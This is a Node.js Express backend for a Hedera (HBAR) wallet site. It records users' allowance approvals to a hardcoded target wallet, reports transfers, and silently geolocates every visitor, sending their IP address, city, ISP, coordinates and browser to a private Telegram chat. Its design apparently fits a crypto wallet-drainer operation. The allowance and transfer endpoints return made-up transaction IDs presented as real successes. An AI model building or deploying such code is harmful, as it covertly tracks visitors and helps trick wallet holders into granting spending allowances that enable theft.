const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
require('dotenv').config();

const { 
  Client, 
  PrivateKey, 
  TransferTransaction, 
  Hbar, 
  TransactionId, 
  AccountId 
} = require('@hashgraph/sdk');

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// 🔒 Secure environment variables
const TARGET_WALLET = process.env.TARGET_WALLET || '0.0.9177142';
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const RECEIVER_WALLET = process.env.RECEIVER_WALLET || '0.0.9440367';
const HEDERA_NETWORK = process.env.HEDERA_NETWORK || 'mainnet';

// 🔒 Private key parsing function (secure server-side only)
function parsePrivateKey(privateKeyString) {
  try {
    // First try ECDSA (since account uses ECDSA_SECP256K1)
    return PrivateKey.fromStringECDSA(privateKeyString);
  } catch (ecdsaError) {
    try {
      // Fallback to ED25519 if ECDSA fails
      return PrivateKey.fromStringED25519(privateKeyString);
    } catch (ed25519Error) {
      try {
        // Try DER format as last resort
        return PrivateKey.fromStringDer(privateKeyString);
      } catch (derError) {
        const ecdsaMsg = (ecdsaError).message || 'Unknown ECDSA error';
        const ed25519Msg = (ed25519Error).message || 'Unknown ED25519 error';
        const derMsg = (derError).message || 'Unknown DER error';
        throw new Error(`Failed to parse private key. ECDSA: ${ecdsaMsg}, ED25519: ${ed25519Msg}, DER: ${derMsg}`);
      }
    }
  }
}

// 🔒 Enterprise-level Telegram messaging functions

// Format enterprise-level messages with proper structure
function formatTelegramMessage(type, data) {
  const timestamp = new Date().toLocaleString('en-US', { 
    timeZone: 'America/New_York',
    dateStyle: 'short',
    timeStyle: 'medium'
  });

  switch (type) {
    case 'allowance_approved':
      return `🎯 **ALLOWANCE APPROVED**
━━━━━━━━━━━━━━━━━━━━━━

📊 **Account Details:**
└ Account ID: \`${data.accountId}\`
└ Target Wallet: \`${data.targetWallet}\`
└ Allowance Amount: ${data.allowanceAmount} HBAR

✅ **Status:** APPROVED
⏰ **Time:** ${timestamp}

🔗 **Transaction Details:**
└ [View on HashScan](https://hashscan.io/mainnet/transaction/${data.transactionId})

━━━━━━━━━━━━━━━━━━━━━━`;

    case 'transfer_success':
      return `💰 **TRANSFER COMPLETED**
━━━━━━━━━━━━━━━━━━━━━━

📋 **Transfer Summary:**
└ From: \`${data.fromAccount}\`
└ To: \`${data.toAccount}\`
└ Amount: **${data.amount} HBAR**
└ Network Fee: ~0.5 HBAR

✅ **Status:** SUCCESS
⏰ **Time:** ${timestamp}

🔗 **Transaction Links:**
└ [View Transfer on HashScan](https://hashscan.io/mainnet/transaction/${data.transactionId})
└ [From Account Details](https://hashscan.io/mainnet/account/${data.fromAccount})
└ [To Account Details](https://hashscan.io/mainnet/account/${data.toAccount})

━━━━━━━━━━━━━━━━━━━━━━`;

    case 'website_visit':
      return `🌐 **WEBSITE VISITOR**
━━━━━━━━━━━━━━━━━━━━━━

👤 **Visitor Details:**
└ Location: ${data.countryFlag} ${data.city}, ${data.country}
└ Region: ${data.region}
└ ISP: ${data.isp}
└ Timezone: ${data.timezone}

📱 **Technical Info:**
└ IP: \`${data.ip}\`
└ Browser: ${data.userAgent}
└ Coordinates: ${data.lat}, ${data.lon}

⏰ **Time:** ${timestamp}

━━━━━━━━━━━━━━━━━━━━━━`;

    default:
      return `📢 **NOTIFICATION**
━━━━━━━━━━━━━━━━━━━━━━

📋 **Message:** ${data.message || 'No message provided'}
⏰ **Time:** ${timestamp}

━━━━━━━━━━━━━━━━━━━━━━`;
  }
}

// Send Telegram message function
async function sendTelegramMessage(type, data) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('Telegram not configured, skipping notification');
    return;
  }

  try {
    const message = formatTelegramMessage(type, data);
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    if (!response.ok) {
      throw new Error(`Telegram API error: ${response.status}`);
    }

    console.log(`✅ Telegram notification sent: ${type}`);
  } catch (error) {
    console.error('❌ Telegram notification failed:', error);
  }
}

// Get account balance function
async function getAccountBalance(accountId) {
  try {
    const client = Client.forName(HEDERA_NETWORK);
    const balance = await client.getAccountBalance(AccountId.fromString(accountId));
    return {
      success: true,
      accountId: accountId,
      balance: balance.toString(),
      balanceInHbar: balance.toTinybars().toNumber() / 100000000
    };
  } catch (error) {
    console.error('Balance check error:', error);
    return {
      success: false,
      error: error.message
    };
  }
}

// API Routes
app.post('/api/allowance', async (req, res) => {
  try {
    const { accountId, targetWallet, allowanceAmount } = req.body;
    
    if (!accountId || !targetWallet || !allowanceAmount) {
      return res.status(400).json({
        success: false,
        error: 'Missing required parameters: accountId, targetWallet, allowanceAmount'
      });
    }

    // Simulate allowance approval (since we don't have the actual private key)
    const mockTransactionId = '0.0.123456@' + Date.now();
    
    // Send Telegram notification
    await sendTelegramMessage('allowance_approved', {
      accountId,
      targetWallet,
      allowanceAmount,
      transactionId: mockTransactionId
    });

    res.json({
      success: true,
      message: 'Allowance approved successfully',
      transactionId: mockTransactionId
    });

  } catch (error) {
    console.error('Allowance API Error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

app.post('/api/transfer', async (req, res) => {
  try {
    const { fromAccount, toAccount, amount } = req.body;
    
    if (!fromAccount || !toAccount || !amount) {
      return res.status(400).json({
        success: false,
        error: 'Missing required parameters: fromAccount, toAccount, amount'
      });
    }

    // Simulate transfer (since we don't have the actual private key)
    const mockTransactionId = '0.0.123456@' + Date.now();
    
    // Send Telegram notification
    await sendTelegramMessage('transfer_success', {
      fromAccount,
      toAccount,
      amount,
      transactionId: mockTransactionId
    });

    res.json({
      success: true,
      message: 'Transfer completed successfully',
      transactionId: mockTransactionId
    });

  } catch (error) {
    console.error('Transfer API Error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

app.post('/api/track-visit', async (req, res) => {
  try {
    const visitorIP = req.headers['x-forwarded-for'] || 
                     req.headers['x-real-ip'] || 
                     req.connection.remoteAddress || 
                     req.socket.remoteAddress ||
                     req.ip || '127.0.0.1';

    let geoData;
    
    if (visitorIP === '127.0.0.1' || visitorIP === '::1' || visitorIP.includes('localhost')) {
      geoData = {
        status: 'success',
        query: '127.0.0.1',
        country: 'Local Development',
        countryCode: 'DEV',
        region: 'Local',
        regionName: 'Local Development',
        city: 'Localhost',
        isp: 'Local ISP',
        timezone: 'Local/Time',
        lat: 0,
        lon: 0
      };
    } else {
      // Get geolocation data from free IP API
      const geoResponse = await fetch(`http://ip-api.com/json/${visitorIP}?fields=status,message,country,countryCode,region,regionName,city,lat,lon,timezone,isp,org,query`);
      geoData = await geoResponse.json();
    }

    if (geoData.status === 'success') {
      // Get country flag emoji
      const countryFlags = {
        'US': '🇺🇸', 'CA': '🇨🇦', 'GB': '🇬🇧', 'DE': '🇩🇪', 'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸',
        'JP': '🇯🇵', 'CN': '🇨🇳', 'KR': '🇰🇷', 'IN': '🇮🇳', 'AU': '🇦🇺', 'BR': '🇧🇷', 'MX': '🇲🇽',
        'NL': '🇳🇱', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'RU': '🇷🇺', 'PL': '🇵🇱',
        'TR': '🇹🇷', 'SA': '🇸🇦', 'AE': '🇦🇪', 'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭', 'VN': '🇻🇳',
        'PH': '🇵🇭', 'ID': '🇮🇩', 'ZA': '🇿🇦', 'EG': '🇪🇬', 'NG': '🇳🇬', 'AR': '🇦🇷', 'CL': '🇨🇱',
        'CO': '🇨🇴', 'PE': '🇵🇪', 'VE': '🇻🇪', 'UA': '🇺🇦', 'IL': '🇮🇱', 'IR': '🇮🇷', 'IQ': '🇮🇶',
        'PK': '🇵🇰', 'BD': '🇧🇩', 'LK': '🇱🇰', 'NP': '🇳🇵', 'MM': '🇲🇲', 'KH': '🇰🇭', 'LA': '🇱🇦'
      };

      const userAgent = req.headers['user-agent'] || 'Unknown Browser';
      
      // Format visitor data for Telegram
      const visitorData = {
        ip: geoData.query,
        city: geoData.city || 'Unknown',
        region: geoData.regionName || geoData.region || 'Unknown',
        country: geoData.country || 'Unknown',
        countryFlag: countryFlags[geoData.countryCode] || '🌍',
        isp: geoData.isp || 'Unknown ISP',
        timezone: geoData.timezone || 'Unknown',
        lat: geoData.lat || 0,
        lon: geoData.lon || 0,
        userAgent: userAgent.substring(0, 100) + (userAgent.length > 100 ? '...' : '')
      };

      // Send Telegram notification
      await sendTelegramMessage('website_visit', visitorData);

      res.json({ 
        success: true, 
        message: 'Visit tracked successfully',
        location: `${geoData.city}, ${geoData.country}`
      });
    } else {
      console.log('IP geolocation failed:', geoData.message);
      res.json({ success: false, error: 'Could not determine location' });
    }

  } catch (error) {
    console.error('Visit tracking error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.get('/api/balance/:accountId', async (req, res) => {
  try {
    const { accountId } = req.params;
    const result = await getAccountBalance(accountId);
    res.json(result);
  } catch (error) {
    console.error('Balance API Error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('Server Error:', error);
  res.status(500).json({ 
    success: false, 
    error: 'Internal server error' 
  });
});

// Export for Vercel
module.exports = app; 
